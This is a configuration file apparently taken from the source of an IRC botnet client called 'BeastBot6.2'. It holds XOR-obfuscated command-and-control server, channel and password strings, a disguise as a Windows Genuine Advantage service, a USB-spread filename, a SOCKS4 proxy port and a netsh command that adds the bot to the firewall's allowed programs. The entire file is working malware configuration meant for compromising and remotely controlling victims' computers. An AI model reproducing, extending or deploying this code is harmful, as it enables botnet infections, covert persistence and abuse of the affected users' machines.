

//Mutex
char xetumhandle[]		= "sfsfsfdsdf"; 

//Bot id
char bid[]			    = "BeastBot6.2";    
  
//Command prefix  
char prefix				= '.';          


unsigned short sock4port= 1080;



char password[] = "\x99\x90\x94\x91\x90\x87\xC5\xC4\xC1";
char authhost1[] = "\xDF\xB5\x99\x90\x92\x9C\x9A\x9B\x9A\x93\x96\x9A\x9B\x81\x90\x98\x85\x81\xDB\x92\x9A\x83";
char exename[] = "\xA2\xB2\xB4\xDB\x90\x8D\x90";
char szRegname[] = "\xA5\x87\x9A\x91\x80\x96\x81\xBC\x91";
char gotopth[] = "\xD0\xA6\x8C\x86\xB1\x9C\x87\xD0";
char infochan[] = "\xD6\xB9\x90\x92\x9C\xC5\x9B\xC5\x93\xB1\xC5\xC5\x98";
char rarexe[] = "OmegaVST.exe";
char usbfname[] = "diskchk.exe";

//No need change Temp Path:
char TempPath[] = "\xB6\xCF\xA9\xA2\x9C\x9B\x91\x9A\x82\x86\xA9\x81\x90\x98\x85\x90\x87\xDB\x90\x8D\x90";



SERVER sinfo[]=
{
	{ 
	//"server","pass",6667,"channel","channelpass","-ix"
	"\x87\x9A\x9A\x81\xDB\x99\x90\x92\x9C\x9A\x9B\xC5\xC4\xC1\xDB\x96\x9A\x98",
	"",
    1880,
	"\xD6\xB9\x90\x92\x9C\xC5\x9B\xC5\x93\xB1\xC5\xC5\x98",
	"\x96\x9A\x9B\x81\x90\x98\x85\x81\xC5\xC4\xC1",
	"\xD8\x9C\x8D",
	},
};

//XOR service settings
#ifndef NO_SERVICE
char servicename[] = "\xA2\xB2\xB4";
char servicedisplayname[] = "\xA2\xB2\xB4";
char servicedesc[] = "\xA2\x9C\x9B\x91\x9A\x82\x86\xB2\x90\x9B\x80\x9C\x9B\x90\xB4\x91\x83\x94\x9B\x81\x94\x92\x90";

#endif

//Don't change this! (Vista fwb)
char fbyp[]				= "netsh firewall add allowedprogram WGA.exe 1 ENABLE";

//Don't change this!
char *authost[] 		= { Decode(authhost1) }; 
 



//IRC Download PARSER
char downloadfile[] = "CHANGE_ME"; //IRC PARSER
//IRC Download PARSER